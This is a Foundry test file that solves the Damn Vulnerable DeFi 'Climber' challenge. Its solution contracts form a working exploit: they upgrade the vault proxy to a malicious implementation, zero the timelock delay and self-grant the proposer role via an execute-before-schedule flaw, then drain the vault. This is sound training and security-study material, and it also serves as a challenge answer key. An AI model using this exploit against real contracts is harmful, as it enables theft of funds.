// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {ClimberVault} from "../../src/climber/ClimberVault.sol";
import {
    ClimberTimelock,
    CallerNotTimelock,
    PROPOSER_ROLE,
    ADMIN_ROLE
} from "../../src/climber/ClimberTimelock.sol";
import {
    ERC1967Proxy
} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {SafeTransferLib} from "solady/utils/SafeTransferLib.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {
    UUPSUpgradeable
} from "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
import {AccessControl} from "@openzeppelin/contracts/access/AccessControl.sol";
contract ClimberChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address proposer = makeAddr("proposer");
    address sweeper = makeAddr("sweeper");
    address recovery = makeAddr("recovery");

    uint256 constant VAULT_TOKEN_BALANCE = 10_000_000e18;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 0.1 ether;
    uint256 constant TIMELOCK_DELAY = 60 * 60;

    ClimberVault vault;
    ClimberTimelock timelock;
    DamnValuableToken token;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);

        // Deploy the vault behind a proxy,
        // passing the necessary addresses for the `ClimberVault::initialize(address,address,address)` function
        vault = ClimberVault(
            address(
                new ERC1967Proxy(
                    address(new ClimberVault()), // implementation
                    abi.encodeCall(
                        ClimberVault.initialize,
                        (deployer, proposer, sweeper)
                    ) // initialization data
                )
            )
        );

        // Get a reference to the timelock deployed during creation of the vault
        timelock = ClimberTimelock(payable(vault.owner()));

        // Deploy token and transfer initial token balance to the vault
        token = new DamnValuableToken();
        token.transfer(address(vault), VAULT_TOKEN_BALANCE);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public {
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
        assertEq(vault.getSweeper(), sweeper);
        assertGt(vault.getLastWithdrawalTimestamp(), 0);
        assertNotEq(vault.owner(), address(0));
        assertNotEq(vault.owner(), deployer);

        // Ensure timelock delay is correct and cannot be changed
        assertEq(timelock.delay(), TIMELOCK_DELAY);
        vm.expectRevert(CallerNotTimelock.selector);
        timelock.updateDelay(uint64(TIMELOCK_DELAY + 1));

        // Ensure timelock roles are correctly initialized
        assertTrue(timelock.hasRole(PROPOSER_ROLE, proposer));
        assertTrue(timelock.hasRole(ADMIN_ROLE, deployer));
        assertTrue(timelock.hasRole(ADMIN_ROLE, address(timelock)));

        assertEq(token.balanceOf(address(vault)), VAULT_TOKEN_BALANCE);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_climber() public checkSolvedByPlayer {
        MaliciousImplementation newVault = new MaliciousImplementation();
        ExploitTimelockExecute exploiter = new ExploitTimelockExecute(
            vault,
            timelock,
            address(newVault)
        );

        exploiter.executeAttack();
        vault.sweepFunds(address(token));
        token.transfer(recovery, token.balanceOf(player));
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        assertEq(token.balanceOf(address(vault)), 0, "Vault still has tokens");
        assertEq(
            token.balanceOf(recovery),
            VAULT_TOKEN_BALANCE,
            "Not enough tokens in recovery account"
        );
    }
}

contract MaliciousImplementation is UUPSUpgradeable {
    //Had to make our malicious implementation upgradable other wise ERC1967InvalidImplementation(0xce110ab5927CC46905460D930CCa0c6fB4666219)] revert will happen since vault the variable which holds the older implementation and will hold newer implementation is child of UUPSUpgradeable
    // we have to define this fn because in UUPSUpgradeable this fn is virtual and abstract
    function _authorizeUpgrade(address newImplementation) internal override {}

    // we just need to match the fn name and storage slot structure
    // only define sweepFunds because we can use it to send all the tokens held by proxy to us
    function sweepFunds(address token) external {
        SafeTransferLib.safeTransfer(
            token,
            msg.sender,
            IERC20(token).balanceOf(address(this))
        );
    }
}
contract ExploitTimelockExecute {
    ClimberVault vault;
    ClimberTimelock timelock;

    address newVault;
    address[] targets = new address[](4);
    //will already have their value 0 by default which is what we want it to be so no need to initialize later
    uint256[] values = new uint256[](4);
    bytes[] dataElements = new bytes[](4);
    bytes32 salt = keccak256("salt");

    constructor(
        ClimberVault _vault,
        ClimberTimelock _timelock,
        address _newVault
    ) {
        vault = _vault;
        timelock = _timelock;
        newVault = _newVault;
    }

    function executeAttack() public {
        targets[0] = address(vault);
        targets[1] = address(timelock);
        targets[2] = address(timelock);
        targets[3] = address(this);

        //Upgrade vault's implementation with out malicious one
        dataElements[0] = abi.encodeCall(
            UUPSUpgradeable.upgradeToAndCall,
            (newVault, "")
        );
        //make the delay 0 so that execute happens instantly without an delay related evert happening
        dataElements[1] = abi.encodeCall(timelock.updateDelay, (0));
        //We grant this current exploiter contract proposer role so that it can schedule our batch for execution
        dataElements[2] = abi.encodeCall(
            AccessControl.grantRole,
            (PROPOSER_ROLE, address(this))
        );
        /*

        we make use of the lack of cei in the timelock execute implementation to schedule our execute after doing it
        we call a separate fn which runs timelock.schedule(targets, values, dataElements, salt) inside
        we don't call it directly because then there will be cyclical recursive relation between execute and schedule making it impossible to schedule our batch

       */
        dataElements[3] = abi.encodeCall(this.maliciousScheduling, ());

        timelock.execute(targets, values, dataElements, salt);
    }
    function maliciousScheduling() external {
        timelock.schedule(targets, values, dataElements, salt);
    }
}
